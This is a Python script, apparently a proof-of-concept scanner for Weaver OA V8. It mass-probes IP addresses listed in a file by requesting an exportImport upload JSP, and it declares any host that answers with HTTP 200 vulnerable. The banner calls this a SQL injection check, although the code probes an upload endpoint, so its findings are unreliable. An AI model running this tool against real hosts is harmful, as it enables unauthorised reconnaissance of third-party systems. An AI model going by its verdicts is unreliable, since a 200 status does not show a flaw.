
import requests
import sys
import re
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
a=[]
def title():
    print('\033[34m+------------------------------------------\033[0m')
    print('+  \033[31m版本: 泛微OA V8 SQL注入漏洞复现 4-8号       \033[0m')
    print('+  \033[31m公众号：深夜笔记本                          \033[0m')
    print('+  \033[31m使用格式: python3 poc.py                  \033[0m')
    print('\033[34m------------------------------------------   \033[0m')

def POC_1(target_url):
    core_url = target_url + "/page/exportImport/uploadOperation.jsp" #poc
    try:
        response = requests.request("GET", url=core_url, timeout=2)
        if response.status_code == 200:  # 返回200
         print("\033[32m[o] 存在利用漏洞  \033[0m",core_url)

    except:
        print("\033[31m[x] 不存在利用漏洞\033[0m")
        return 1

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        g=f.read()
    a=re.findall('\d{1,3}[.]\d{1,3}[.]\d{1,3}[.]\d{1,3}[:]\d+',g)

    for i in a:
        if 'http' in i:
            target_url = str(i)
        else:
            target_url = 'http://'+str(i)
        POC_1(target_url)